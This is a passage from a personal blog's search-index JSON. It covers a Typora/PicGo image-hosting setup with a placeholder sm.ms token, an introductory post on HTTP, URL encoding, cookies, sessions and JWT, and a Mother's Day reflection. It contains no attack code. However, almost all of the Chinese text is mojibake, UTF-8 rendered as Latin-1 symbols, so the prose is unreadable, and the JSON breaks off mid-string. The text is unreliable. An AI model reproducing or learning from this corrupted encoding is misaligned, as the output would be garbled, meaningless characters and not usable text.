ç„¶åè®¿é—®ä¸‹é¢é“¾æ¥ 1https://sm.ms/home/apitoken ç‚¹å‡»ç”ŸæˆToken ç„¶åç‚¹å‡»Typoraä¸­çš„æ‰“å¼€é…ç½®æ–‡ä»¶ 123456789&#123; &quot;picBed&quot;: &#123; &quot;uploader&quot;: &quot;smms&quot;, &quot;smms&quot;: &#123; &quot;token&quot;: &quot;ä½ ä¸Šä¸ªé¡µé¢çš„ç”³è¯·çš„token&quot; &#125; &#125;, &quot;picgoPlugins&quot;: &#123;&#125; &#125; å†™å…¥Tokenï¼Œä¿å­˜ æœ€å éªŒè¯å›¾ç‰‡ä¸Šä¼ é€‰é¡¹è¿›è¡ŒéªŒè¯ å³å¯ å››ã€å‚è€ƒé“¾æ¥next ä¸»é¢˜é…ç½®å®˜æ–¹ hexo å®˜æ–¹ä½¿ç”¨æ–‡æ¡£ Github + PicGo å‚è€ƒ åšå®¢æ­å»ºå…¨1 HEXO åšå®¢æ­å»ºå…¨ https://blog.csdn.net/nineya_com/article/details/103308963 hiker ä¸»é¢˜ç•Œé¢è®¾ç½® https://www.bilibili.com/video/BV1cW411A7Jx?p=4 https://blog.csdn.net/jspnetcn/article/details/104111651?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.baidujs","categories":[{"name":"åšå®¢éƒ¨ç½²","slug":"åšå®¢éƒ¨ç½²","permalink":"https://xizhi-future.github.io/categories/%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2/"}],"tags":[{"name":"åšå®¢","slug":"åšå®¢","permalink":"https://xizhi-future.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"Hexo","slug":"Hexo","permalink":"https://xizhi-future.github.io/tags/Hexo/"},{"name":"å›¾åºŠ","slug":"å›¾åºŠ","permalink":"https://xizhi-future.github.io/tags/%E5%9B%BE%E5%BA%8A/"}],"author":"xizhi-future"},{"title":"WebåŸºç¡€","slug":"WebåŸºç¡€","date":"2021-05-24T05:25:50.000Z","updated":"2021-07-09T07:26:11.425Z","comments":true,"path":"2021/05/24/WebåŸºç¡€/","link":"","permalink":"https://xizhi-future.github.io/2021/05/24/Web%E5%9F%BA%E7%A1%80/","excerpt":"æ”»å‡»è€…æ”»å‡»æœåŠ¡å™¨â€“é¦–å…ˆè¦ä¿è¯ä¸¤è€…ä¹‹é—´èƒ½æ­£å¸¸çš„è¿›è¡Œé€šä¿¡å¦‚ä½•é€šä¿¡ï¼ŸæœåŠ¡å™¨ä¸Šçš„å„ç§æœåŠ¡éƒ½æ˜¯ä¾æ‰˜äº ç«¯å£ æ¥å®ç°å¯¹å¤–æä¾›æœåŠ¡çš„ï¼Œæ”»å‡»è€…æ‰€å…¥ä¾µçš„å°±æ˜¯ç«¯å£ä»€ä¹ˆæ˜¯Webåº”ç”¨ï¼Ÿæä¾›W e bæœåŠ¡çš„åº”ç”¨ç³»ç»Ÿ,å…¶å®é€šä¿—è®²å°±æ˜¯ä¸€ä¸ªç½‘ç«™ã€‚","text":"æ”»å‡»è€…æ”»å‡»æœåŠ¡å™¨â€“é¦–å…ˆè¦ä¿è¯ä¸¤è€…ä¹‹é—´èƒ½æ­£å¸¸çš„è¿›è¡Œé€šä¿¡å¦‚ä½•é€šä¿¡ï¼ŸæœåŠ¡å™¨ä¸Šçš„å„ç§æœåŠ¡éƒ½æ˜¯ä¾æ‰˜äº ç«¯å£ æ¥å®ç°å¯¹å¤–æä¾›æœåŠ¡çš„ï¼Œæ”»å‡»è€…æ‰€å…¥ä¾µçš„å°±æ˜¯ç«¯å£ä»€ä¹ˆæ˜¯Webåº”ç”¨ï¼Ÿæä¾›W e bæœåŠ¡çš„åº”ç”¨ç³»ç»Ÿ,å…¶å®é€šä¿—è®²å°±æ˜¯ä¸€ä¸ªç½‘ç«™ã€‚ ä¸€ã€è®¿é—®ç½‘é¡µæµç¨‹1.1 è®¿é—®é™æ€ç½‘é¡µæµç¨‹ ç¼–å†™ï¼šHTML , CSS , JavaScript æµç¨‹ï¼šåœ¨ æµ è§ˆ å™¨ ä¸­ è¾“ å…¥h t t p : / / w w w . s e c u r i t y . c o m / a d m i n / i n d e x . h t m l å å› è½¦ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€HTTPè¯·æ±‚æŠ¥æ–‡ï¼ŒæœåŠ¡ç«¯é€šè¿‡è¿è¡Œå…¶å«æœ‰çš„Webåº”ç”¨æœåŠ¡å™¨ï¼ˆWebå®¹å™¨ï¼Œä¸­é—´ä»¶ï¼‰å¯¹æ¥æ”¶åˆ°çš„è¯·æ±‚è¿›è¡Œå¤„ç†â€“åˆ¤æ–­è¯·æ±‚çš„æ–‡ä»¶æ‰©å±•åï¼Œåœ¨ç½‘ç«™çš„æ ¹ç›®å½•ä¹‹ä¸‹å¯»æ‰¾å¯¹åº”çš„æ–‡ä»¶ï¼ŒWebåº”ç”¨æœåŠ¡å™¨å†æ„å»ºHTTPå“åº”æŠ¥æ–‡å°†æ–‡ä»¶æºä»£ç è¿”å›ç»™æµè§ˆå™¨ï¼Œä»£ç ç»è¿‡æµè§ˆå™¨çš„æ¸²æŸ“è¿‡åå‘ˆç°çš„ç”»é¢ä¾›å®¢æˆ·ç«¯ä½¿ç”¨ã€‚ 1.2 è®¿é—®åŠ¨æ€ç½‘é¡µæµç¨‹ ç¼–å†™ï¼š.php , .jsp , .asp , .aspx ï¼Œä¸€èˆ¬ ç”±HTML+CSS+JavaScript+åç«¯è¯­è¨€ä»£ç ç»„æˆã€‚ æµç¨‹ï¼šåˆ¤æ–­è¯·æ±‚æ–‡ä»¶æ‰©å±•åä¹‹åï¼Œå°†ä¼šå°†å¯¹åº”çš„æ–‡ä»¶äº¤ç»™ PHPè„šæœ¬å¼•æ“ å»å¤„ç†ï¼Œä½¿ä¹‹è§£ææ–‡ä»¶å½“ä¸­çš„ PHP ä»£ç ï¼Œå¦‚æœä»£ç ä¸­æ¶‰åŠåˆ°é˜Ÿæ•°æ®åº“çš„æ“ä½œã€‚å®ƒä¼šè¯·æ±‚ç›¸åº”çš„æ•°æ®åº“ï¼Œè®©æ•°æ®åº“å»æ‰§è¡Œé˜Ÿæ•°æ®çš„å¢åˆ æ”¹æŸ¥ç­‰æ“ä½œï¼Œç„¶åå°†å¤„ç†çš„ç»“æœè¿”å›ç»™PHPè„šæœ¬å¼•æ“ã€‚PHPè„šæœ¬å¼•æ“å°†ç»“æœäº¤ç»™ Web åº”ç”¨æœåŠ¡å™¨ï¼ˆApacheï¼‰ï¼ŒWeb åº”ç”¨æœåŠ¡å™¨æ„å»ºHTTPå“åº”æŠ¥æ–‡ï¼Œç”±æœåŠ¡ç«¯å‘é€ç»™æµè§ˆå™¨ï¼Œç»è¿‡è§£æä¹‹åï¼Œç”±å®¢æˆ·ç«¯ä½¿ç”¨ã€‚ æ•°æ®åº“ï¼šSQL Server , MySQL , Oracle äºŒã€Webåº”ç”¨åŸºæœ¬æ¶æ„Webåº”ç”¨ç¨‹åºçš„è®¾è®¡è€…ã€Webåº”ç”¨æœåŠ¡å™¨ã€åŠ¨æ€è„šæœ¬å¼•æ“(æœåŠ¡ç«¯ç¨‹åºè¯­è¨€)ã€æ•°æ®åº“ å¸¸è§WebæœåŠ¡ç«¯æ¶æ„ï¼š LAMPå’ŒWAMPå°±æ˜¯Windows/Linux+Apache+PHP+MySQL ä¸‰ã€URLURLï¼šç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼ˆç½‘é¡µåœ°å€ï¼Œç½‘å€ï¼‰ï¼Œç”¨äºå®šä½æœåŠ¡å™¨çš„èµ„æºï¼ˆæ–‡æ¡£ï¼Œé¡µé¢ï¼Œå›¾åƒç­‰ç­‰ï¼‰ æ ‡å‡†æ ¼å¼ : protocol://userInfo@hostname[:port]/path/[?query]#fragment çœŸæ­£è®¿é—®çš„æ˜¯@ä¹‹åçš„åœ°å€ userInfoï¼šuser:password ä¸æ¨è äº•å·ï¼šåœ¨URLä¸­æŒ‡å®šçš„æ˜¯é¡µé¢ä¸­çš„ä¸€ä¸ªä½ç½® äº•å·ä½œä¸º é¡µé¢å®šä½ç¬¦ å‡ºç°åœ¨URLä¸­ï¼Œæ¯”å¦‚ï¼šhttp://www.httpwatch.com/features.htm#print ï¼Œæ­¤URLè¡¨ç¤ºåœ¨é¡µé¢features.htmä¸­printçš„ä½ç½®ã€‚æµè§ˆå™¨è¯»å–è¿™ä¸ªURLåï¼Œä¼šè‡ªåŠ¨å°†printä½ç½®æ»šåŠ¨è‡³å¯è§†åŒºåŸŸã€‚ URLç¼–ç ï¼š äº§ç”ŸåŸå› ï¼šä¸€äº›ç‰¹æ®Šå­—ç¬¦ä¼šå«æœ‰ä¸åŒè€Œå«ä¹‰ï¼š?username=1&amp;passwd=2%263 ï¼Œä¸ºäº†åŒºåˆ†ã€‚RFCæ ‡å‡†æå‡º URLç¼–ç æ–¹æ¡ˆ å¸¸è§ï¼š 123456789= %3d# %23% %25&amp; %26/ %2fç©ºæ ¼ %20æ¢è¡Œ %0aç©ºå­—èŠ‚ %00åŠ å· + ä»£è¡¨URLç¼–ç å½“ä¸­çš„ ç©ºæ ¼ å››ã€HTTPHTTP ï¼ˆHyperText Transfer Protocolï¼‰è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆè¯·æ±‚/å“åº”åè®®ï¼‰ï¼šè§„å®šæµè§ˆå™¨ä¸ä¸‡ç»´ç½‘æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡è§„åˆ™ã€‚æ— çŠ¶æ€çš„åè®® 4.1 HTTP åè®®æŠ¥æ–‡4.1.1 è¯·æ±‚æŠ¥æ–‡ è¯·æ±‚è¡Œ ï¼šè¯·æ±‚æ–¹æ³• /URL /HTTPåè®®ç‰ˆæœ¬ ç©ºæ ¼éš”ç¦» è¯·æ±‚å¤´éƒ¨ï¼šå‘ŠçŸ¥æœåŠ¡å™¨å®¢æˆ·ç«¯è¯·æ±‚çš„ä¿¡æ¯ï¼Œå…³é”®å­—:å€¼ï¼Œæ¯è¡Œä¸€å¯¹ 123456Host è¢«è¯·æ±‚èµ„æºçš„ä¸»æœºåUser-Agent äº§ç”Ÿè¯·æ±‚çš„æµè§ˆå™¨ç±»å‹Accept å®¢æˆ·ç«¯å¯å¤„ç†çš„ MIME ç±»å‹Accept-Encoding å®¢æˆ·ç«¯èƒ½å¤Ÿç†è§£çš„å†…å®¹ç¼–ç æ–¹å¼Accept-Language å®¢æˆ·ç«¯å¯ç†è§£çš„è¯­è¨€Cookie å®¢æˆ·ç«¯èº«ä»½å‡­è¯ Referer é‡å®šå‘æ—¶ï¼Œå£°æ˜ç”¨æˆ·ä»ä»€ä¹ˆåœ°æ–¹ï¼ˆä¸Šä¸€ä¸ªURLï¼‰åˆ°è¾¾ç°åœ¨çš„URLçš„ã€‚ä¾‹å¦‚ï¼šç™»é™†é¡µé¢ï¼Œå½“ç”¨æˆ·ç™»é™†æˆåŠŸä¹‹åï¼ŒHTTPè¯·æ±‚æŠ¥æ–‡ä¸­ä¼šæœ‰Refererå­—æ®µâ€“æ˜¾ç¤ºç”¨æˆ·æ˜¯ä»ä»€ä¹ˆåœ°æ–¹è·³è½¬åˆ°æˆåŠŸç™»å½•ä¹‹åçš„ç•Œé¢çš„ï¼ŒæœåŠ¡ç«¯ä¼šè¿›è¡Œæ£€æµ‹ï¼Œç”¨äºåˆ¤æ–­å‡†ç¡®æ€§ã€‚ Postæ–¹å¼ï¼šç»å¸¸ä¼šæœ‰ Content-Type å’Œ Content-Lengthå­—æ®µ ç©ºè¡Œ è¯·æ±‚çš„æ•°æ® Getæ–¹å¼ï¼šæ²¡æœ‰è¯·æ±‚æ­£æ–‡ï¼Œè¯·æ±‚çš„æ•°æ®åœ¨URLå½“ä¸­ Postæ–¹å¼ï¼šè¯·æ±‚æŠ¥æ–‡å½“ä¸­çš„æœ€ä¸‹é¢ 4.1.2 å“åº”æŠ¥æ–‡ çŠ¶æ€è¡Œ ï¼š HTTPåè®®ç‰ˆæœ¬ çŠ¶æ€ç  çŠ¶æ€æè¿° ç©ºæ ¼éš”ç¦» çŠ¶æ€ç ï¼š 123451xx ä¿¡æ¯--æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œéœ€è¦è¯·æ±‚è€…ç»§ç»­æ‰§è¡Œæ“ä½œ2xx æˆåŠŸ--æ“ä½œæˆåŠŸè¢«æœåŠ¡å™¨æ¥æ”¶å¹¶å¤„ç†3xx é‡å®šå‘--éœ€è¦è¿›ä¸€æ­¥æ“ä½œæ‰å¯å®Œæˆè¯·æ±‚4xx å®¢æˆ·ç«¯è¯·æ±‚æ—¶é”™è¯¯5xx æœåŠ¡ç«¯å¤„ç†è¯·æ±‚æ—¶é”™è¯¯ çŠ¶æ€æè¿°ï¼š çŠ¶æ€ç  çŠ¶æ€æè¿° è¯´æ˜ 200 OK è¯·æ±‚æˆåŠŸ 304 Not Modified ç›´æ¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜ 400 Bad Request å®¢æˆ·ç«¯è¯·æ±‚è¯­æ³•é”™è¯¯ï¼ŒæœåŠ¡å™¨æ— æ³•ç†è§£ 401 Unauthorized è¯·æ±‚æœªç»æˆæƒ 403 Forbidden æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ä½†æ‹’ç»æä¾›æœåŠ¡ 404 Not Found è¯·æ±‚èµ„æºä¸å­˜åœ¨ 500 Internal Server Error æœåŠ¡å™¨å‘ç”Ÿäº†ä¸å¯é¢„çŸ¥çš„é”™è¯¯ 503 Server Unavaiable æœåŠ¡å™¨å½“å‰æ— æ³•å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ å“åº”å¤´éƒ¨ï¼šæè¿°æœåŠ¡å™¨ä¿¡æ¯ å…³é”®å­—:å€¼ï¼Œæ¯è¡Œä¸€å¯¹ 1234567Date è¯·æ±‚å‘é€çš„æ—¶é—´ æ—¥æœŸServer å‘ŠçŸ¥å®¢æˆ·ç«¯æœåŠ¡å™¨çš„åç§°ä¸ç‰ˆæœ¬å·Content-Type å“åº”æ­£æ–‡çš„ MIMEç±»å‹Content-Length å“åº”æ­£æ–‡çš„é•¿åº¦Connection å‘ŠçŸ¥å®¢æˆ·ç«¯å“åº”å®Œæˆä¹‹åçš„è¿æ¥çŠ¶æ€Content-Encoding WebæœåŠ¡å™¨å‘Šè¯‰æµè§ˆå™¨ä½¿ç”¨çš„æ˜¯å“ªç§å‹ç¼©æ–¹æ³•Last-Modified æŒ‡å®šèµ„æºçš„æœ€åä¿®æ”¹æ—¶é—´ä¸æ—¥æœŸ ç©ºè¡Œ å“åº”æ­£æ–‡ 4.2 HTTPè¯·æ±‚æ–¹æ³•â€“8ç§æœåŠ¡ç«¯æ ¹æ®ä¸åŒçš„è¯·æ±‚æ–¹æ³•åšå‡ºä¸åŒçš„å“åº” GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT GET ï¼šURLå½“ä¸­å‘é€ï¼Œæœ‰é•¿åº¦é™åˆ¶ POST ï¼šåœ¨HTTPè¯·æ±‚æ­£æ–‡å½“ä¸­å‘é€ï¼Œæ— é•¿åº¦å¤§å°é™åˆ¶ï¼Œå¯ä¼ é€’å¤§é‡æ•°æ®ã€‚ ä¸€èˆ¬ç”¨äºæ›´æ–°èµ„æºä¿¡æ¯ï¼Œå‘æœåŠ¡å™¨æäº¤æ•°æ®ã€‚ä¾‹å¦‚ï¼šç™»å½•ï¼Œæ³¨å†Œï¼Œä¿®æ”¹èµ„æ–™ï¼Œä¸Šä¼ æ–‡ä»¶ç­‰ç­‰ å®‰å…¨æ€§ï¼šä¸å®‰å…¨ï¼Œé»‘å®¢å¯è·å–ï¼Œä¿®æ”¹é€šä¿¡å†…å®¹ï¼Œå†’å……ä»–äººèº«ä»½ è§£å†³ï¼šHTTPSåè®®ï¼ˆHyperText Transfer Prototol over Secure Socket Laterï¼‰:åœ¨HTTPåŸºç¡€ä¸ŠåŠ äº† SSL/TLSå±‚ã€‚ äº”ã€ä¼šè¯æŠ€æœ¯ç›—å– Cookie ä¼šè¯åŠ«æŒ äº§ç”ŸåŸå› ï¼šHTTPåè®®æ˜¯æ— è¿æ¥ï¼Œæ— çŠ¶æ€çš„ï¼Œæ— æ³•è®°ä½å®¢æˆ·ç«¯çš„ä¿¡æ¯ã€‚äºæ˜¯äº§ç”Ÿäº†ä¼šè¯æŠ€æœ¯ï¼šSession , cookie **Cookie : **ç”±æœåŠ¡ç«¯ç”Ÿæˆï¼Œç”±æœåŠ¡å™¨å°†æ•°æ®é€šè¿‡HTTPå“åº”å‚¨å­˜åˆ°æµè§ˆå™¨ä¸Šï¼Œåˆ™æµè§ˆå™¨åœ¨ä»¥åå°±å¯ç›´æ¥æºå¸¦ä¸Šè¿™ä¸ª Cookie è®¿é—®è¯¥æœåŠ¡å™¨ã€‚ å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯·æ±‚ï¼šPHP çš„ setcookie å‡½æ•° å°† cookieæ•°æ® é€šè¿‡HTTPåè®®ä¸å“åº”å¤´ä¼ ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨ç¬¬ä¸€æ¬¡å“åº”æ—¶å°†Cookieæ•°æ®ä¿å­˜åˆ°æµè§ˆå™¨ä¸Šã€‚ å®¢æˆ·ç«¯å†æ¬¡å‘é€è¯·æ±‚ï¼šé¦–å…ˆè‡ªåŠ¨æ£€æµ‹æœ¬åœ°æ˜¯å¦å­˜åœ¨Cookieæ•°æ®ï¼Œè‹¥å­˜åœ¨ï¼Œç›´æ¥åœ¨è¯·æ±‚å¤´å½“ä¸­å°†Cookieæ•°æ®å‘é€ç»™æœåŠ¡å™¨ï¼›PHPæ‰§è¡Œè‡ªåŠ¨åˆ¤æ–­æµè§ˆå™¨è¯·æ±‚ä¸­æ˜¯å¦æºå¸¦Cookieï¼Œæœ‰çš„è¯ï¼Œè‡ªåŠ¨ä¿å­˜åˆ° $_COOKIE å½“ä¸­ï¼›åˆ©ç”¨ $ _COOKIE è®¿é—® Cookieæ•°æ®ã€‚ **Session : **ä¸æµè§ˆå™¨æ— å…³ï¼Œä»¥Cookieä¸ºåŸºç¡€ï¼Œå°†é‡è¦çš„æ•°æ®ä¿å­˜åˆ°æœåŠ¡ç«¯ï¼ŒåŒæ—¶å°†èƒ½å¤Ÿå”¯ä¸€è¡¨ç¤ºè¿™ä¸ªæ•°æ®çš„æ•°æ®ä»¥COOKIEçš„å½¢å¼ä¿å­˜åœ¨å®¢æˆ·ç«¯ã€‚ å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯·æ±‚ï¼šåˆ›å»º SESSIONID ï¼›åˆå§‹åŒ–è¶…å…¨å±€å˜é‡ $_SESSIONï¼›åœ¨phpæŒ‡å®šç›®å½•åˆ›å»ºSESSIONIdä¸ºåçš„æ–‡ä»¶ï¼›è„šæœ¬æ‰§è¡Œç»“æŸï¼Œå°†$_SESSIONä¸­ä¿å­˜çš„æ‰€æœ‰æ•°æ®åºåˆ—åŒ–å­˜å‚¨åˆ°SessionIDå¯¹åº”çš„æ–‡ä»¶ä¸­ã€‚å¹¶ å°†SESSIONIDä»¥SETCOOKIEçš„å½¢å¼è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œç›¸å½“äº å°†SESSIONID å†™å…¥ COOKIE å½“ä¸­ã€‚ å®¢æˆ·ç«¯å†æ¬¡å‘é€è¯·æ±‚ï¼šæ£€æµ‹åˆ° å®¢æˆ·ç«¯çš„COOKIEä¸­çš„SESSIONID ï¼›åˆå§‹åŒ–è¶…å…¨å±€å˜é‡$_SESSIONï¼›æ‰¾åˆ°æ–‡ä»¶ï¼Œååºåˆ—åŒ–è¯»å–æ•°æ®å­˜å‚¨åˆ°$_SESSIONä¸­ï¼›è„šæœ¬æ‰§è¡Œç»“æŸï¼Œå°†$_SESSIONä¸­ä¿å­˜çš„æ‰€æœ‰æ•°æ®åºåˆ—åŒ–å­˜å‚¨åˆ°SESSIONIDå¯¹åº”çš„æ–‡ä»¶ä¸­ã€‚ ç™»é™†åˆ¤æ–­ï¼š ç”¨æˆ·æˆåŠŸç™»å½•ä¹‹åï¼ŒæœåŠ¡å™¨é€šè¿‡ SESSIONæœºåˆ¶ å°†ç”¨æˆ·ä¿¡æ¯å­˜å‚¨åˆ°æœåŠ¡ç«¯ï¼Œå¹¶å°† SESSIONID ä»¥ SETCOOKIE çš„å½¢å¼è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ ç”¨æˆ·ä¸‹ä¸€æ¬¡è®¿é—®ç«™ç‚¹æ—¶ï¼Œè‡ªåŠ¨æºå¸¦COOKIEä¿¡æ¯ï¼ŒæœåŠ¡ç«¯æ ¹æ®COOKIEå½“ä¸­çš„ SESSIONID è¿›è¡Œæ•°æ®åŒ¹é…ï¼Œå­˜åœ¨è¯æ˜å·²ç™»å½•è¿‡ã€‚ å…­ã€JWT åŸç†JWT åŸç† JSON Web Tokenï¼ŒæœåŠ¡å™¨è®¤è¯ä¹‹åï¼Œä¼šç”Ÿæˆä¸€ä¸ª JSONå¯¹è±¡ï¼Œæ¯”å¦‚ï¼š 12345&#123; &quot;å§“å&quot;: &quot;å¼ ä¸‰&quot;, &quot;è§’è‰²&quot;: &quot;ç®¡ç†å‘˜&quot;, &quot;åˆ°æœŸæ—¶é—´&quot;: &quot;2018å¹´7æœˆ1æ—¥0ç‚¹0åˆ†&quot;&#125; ç”¨æˆ·æ¯æ¬¡ä¸æœåŠ¡ç«¯é€šä¿¡çš„æ—¶å€™éƒ½è¦å‘å›è¿™ä¸ª JSONå¯¹è±¡ï¼ŒæœåŠ¡å™¨å°±é€šè¿‡è¿™ä¸ªå¯¹è±¡æ¥è®¤è¯ç”¨æˆ·èº«ä»½ã€‚ä¸ºé˜²æ­¢ç”¨æˆ·ç¯¡æ”¹æ•°æ®ï¼ŒæœåŠ¡å™¨åœ¨ç”Ÿæˆè¿™ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šåŠ ä¸Šä¸€ä¸ª ç­¾åã€‚ JWT ç»„æˆï¼šHeader.Payload.Signature Headerï¼šå¤´éƒ¨ç”¨äºæè¿°å…³äºè¯¥JWTçš„æœ€åŸºæœ¬çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å…¶ç±»å‹ä»¥åŠç­¾åæ‰€ç”¨çš„ç®—æ³•ç­‰ Payloadï¼šè½½è·å°±æ˜¯å­˜æ”¾æœ‰æ•ˆä¿¡æ¯çš„åœ°æ–¹ï¼Œå³ç”¨æ¥å­˜æ”¾å®é™…éœ€è¦ä¼ é€’çš„æ•°æ®â€”æ ‡å‡†ä¸­æ³¨å†Œçš„å£°æ˜ï¼Œå…¬å…±çš„å£°æ˜ï¼Œç§æœ‰çš„å£°æ˜ Signatureï¼šè¿™ä¸ªéƒ¨åˆ†éœ€è¦base64åŠ å¯†åçš„headerå’Œbase64åŠ å¯†åçš„payloadä½¿ç”¨.è¿æ¥ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œç„¶åé€šè¿‡headerä¸­å£°æ˜çš„åŠ å¯†æ–¹å¼è¿›è¡ŒåŠ ç›secretç»„åˆåŠ å¯†","categories":[{"name":"WebåŸºç¡€ç¯‡","slug":"WebåŸºç¡€ç¯‡","permalink":"https://xizhi-future.github.io/categories/Web%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"Webåº”ç”¨åŸºæœ¬æ¶æ„","slug":"Webåº”ç”¨åŸºæœ¬æ¶æ„","permalink":"https://xizhi-future.github.io/tags/Web%E5%BA%94%E7%94%A8%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84/"},{"name":"HTTP","slug":"HTTP","permalink":"https://xizhi-future.github.io/tags/HTTP/"},{"name":"ä¼šè¯æŠ€æœ¯","slug":"ä¼šè¯æŠ€æœ¯","permalink":"https://xizhi-future.github.io/tags/%E4%BC%9A%E8%AF%9D%E6%8A%80%E6%9C%AF/"}],"author":"xizhi-future"},{"title":"2021å¹´çš„æ¯äº²èŠ‚","slug":"2021å¹´çš„æ¯äº²èŠ‚","date":"2021-05-09T11:25:17.000Z","updated":"2021-10-07T09:34:02.094Z","comments":true,"path":"2021/05/09/2021å¹´çš„æ¯äº²èŠ‚/","link":"","permalink":"https://xizhi-future.github.io/2021/05/09/2021%E5%B9%B4%E7%9A%84%E6%AF%8D%E4%BA%B2%E8%8A%82/","excerpt":"","text":"â€‹ ä»å‰æˆ‘æ€»æ˜¯ä¸æ›¾åœ¨æ„ä¸€äº›èŠ‚æ—¥ï¼Œå°±è¿èº«è¾¹äººçš„ç”Ÿæ—¥ä¹Ÿä»ä¸ä¸Šå¿ƒï¼Œä¹Ÿè®¸æ˜¯ç¦»å®¶ä¹…äº†ï¼Œä¹Ÿè®¸äº†è‡ªå·±é•¿å¤§äº†è®¸å¤šï¼Œä¹Ÿè®¸æ˜¯è‡ªå·±åœ¨å®³æ€•äº›ä»€ä¹ˆï¼Œä¹Ÿè®¸æ˜¯è‡ªå·±çªç„¶æ„è¯†åˆ°æŸäº›ä¸œè¥¿å®ƒå¹¶ä¸æ˜¯ä¸€æˆä¸å˜çš„ï¼Œåˆ°äº†ä»Šå¹´ä»Šæ—¥ï¼Œæˆ‘å†ä¹Ÿæ— æ³•å¯¹è¿™äº›èŠ‚æ—¥é¿è®³ï¼Œæˆ‘æ„è¯†åˆ°ï¼Œä»Šå¤©è¿‡åï¼Œæˆ‘éœ€è¦åšå‡ºä¸€äº›æ”¹å˜ã€‚ â€‹ ä»¥ä¸‹æ˜¯æˆ‘æƒ³å¯¹å¥¹è¯´çš„è¯ï¼š æ¯äº²èŠ‚åˆ°äº†ï¼Œä½ è¦å½“ä¸€ä¸ªä¹–ä¸€ç‚¹çš„å¦ˆå¦ˆï¼Œå¤šé™ªæˆ‘èŠèŠå¤©ï¼›å¤šå­¦ç€åšä¸€äº›å¥½åƒçš„é¥­ï¼›å¤šå¤šæŠŠæˆ‘çš„æˆ¿é—´æ‰“æ‰«çš„å¹²å¹²å‡€å‡€ï¼›å¤šå¤šå¬ä¸€äº›æˆ‘æ¨èç»™ä½ çš„æ­Œï¼›å¤šå¤šå¬æˆ‘åŠ³åŠ›å” å¨ï¼ŒæŠ±æ€¨è¿™æŠ±æ€¨é‚£ï¼›å¤šå¤šå¬æˆ‘è®²æˆ‘å¥½æƒ³è®²çš„è¯ï¼Œå…³äºæ­Œæ‰‹çš„ï¼Œå…³äºæ˜æ˜Ÿçš„ï¼Œå…³äºç”µè§†å‰§çš„ï¼Œå…³äºç”µå½±çš„ï¼Œå…³äºæ°å“¥çš„ï¼Œå…³äºå­¦æ ¡çš„ï¼Œå…³äºæœ‹å‹çš„ï¼Œå…³äºæˆ‘é‡åˆ°çš„å¥½å¤šå¥½å¤šäº‹ï¼›å¤šå¤šç»™æˆ‘ä¸€äº›é¢„æ–™ä¸åˆ°çš„å¥½åƒçš„ï¼›å¤šå¤šèº«ä½“å¥½ä¸€äº›ï¼›å¤šå¤šå¿«ä¹ä¸€äº›ï¼›å¤šå¤šåœ¨å…¨æ°‘Kæ­Œä¸Šå”±æ­Œï¼›å¤šå¤šå’Œæœ‹å‹å‡ºå»æ•£å¿ƒï¼›å¤šå¤šè¡¨è¾¾å‡ºè‡ªå·±çš„æ„Ÿæƒ…ï¼›å¤šå¤šå¯¹è‡ªå·±å¥½ä¸€ç‚¹ï¼›å°‘åƒç‚¹æ³¡é¢ï¼Œå¤šåƒäº›è‚‰ï¼›å¤šå¤šåƒä½ æœ€çˆ±çš„è‹¹æœï¼›å¤šå¤šå–çƒ­æ°´ï¼›æ—©ç‚¹ç¡ï¼Œæ™šç‚¹èµ·ï¼›å°‘æƒ³é‚£äº›ä¹±ä¸ƒå…«ç³Ÿçš„ï¼›ä¸ç”¨æ‹…å¿ƒæˆ‘ï¼Œä¸ç”¨è€ƒè™‘æœªæ¥ï¼ˆåæ­£ä¸€å®šæ˜¯è·Ÿæˆ‘åœ¨ä¸€èµ·çš„ï¼‰ï¼›å°±è¿™æ ·å§ï¼Œä¹Ÿè¯´çš„æŒºå¤šäº†ï¼Œåæ­£å°±æ˜¯ï¼Œä½ è¦è®°å¾—ï¼Œåšä¸€ä¸ªä¹–ä¸€ç‚¹çš„å¦ˆå¦ˆå“¦ï¼ 2021.5.9","categories":[{"name":"ç”Ÿæ´»æ‚è°ˆ","slug":"ç”Ÿæ´»æ‚è°ˆ","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"}],"categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"},{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"ç”Ÿæ´»æ‚è°ˆ","slug":"ç”Ÿæ´»æ‚è°ˆ","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"},{"name":"éŸ³ä¹åˆ†äº«","slug":"éŸ³ä¹åˆ†äº«","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"},{"name":"è®¡ç½‘","slug":"è®¡ç½‘","permalink":"https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"},{"name":"WEBæ¼æ´è¯¦è§£","slug":"WEBæ¼æ´è¯¦è§£","permalink":"https://xizhi-future.github.io/categories/WEB%E6%BC